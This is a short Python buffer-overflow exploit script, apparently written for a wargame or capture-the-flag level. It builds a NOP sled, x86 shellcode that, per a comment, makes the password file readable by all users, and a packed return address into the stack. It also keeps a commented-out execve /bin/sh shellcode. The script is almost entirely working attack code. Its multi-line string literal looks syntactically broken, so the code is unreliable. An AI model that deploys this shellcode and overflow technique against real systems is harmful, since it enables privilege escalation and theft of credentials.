import struct

ADDR_GETS = 0xffffd670

#payload=b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"  #21 long
# cant use this shellcode because child process protected against execve

# we ll use an other one to chmod the password file to all users so we can read it with lv4

payload="
\x89\xc3\x31\xd8\x50\xbe\x3e\x1f
\x3a\x56\x81\xc6\x23\x45\x35\x21
\x89\x74\x24\xfc\xc7\x44\x24\xf8
\x2f\x2f\x73\x68\xc7\x44\x24\xf4
\x2f\x65\x74\x63\x83\xec\x0c\x89
\xe3\x66\x68\xff\x01\x66\x59\xb0
\x0f\xcd\x80
"

exploit="\x90"*100
exploit+=payload
exploit+="\x90"*35
exploit+=struct.pack("I", ADDR_GETS+0x10)

print(exploit)
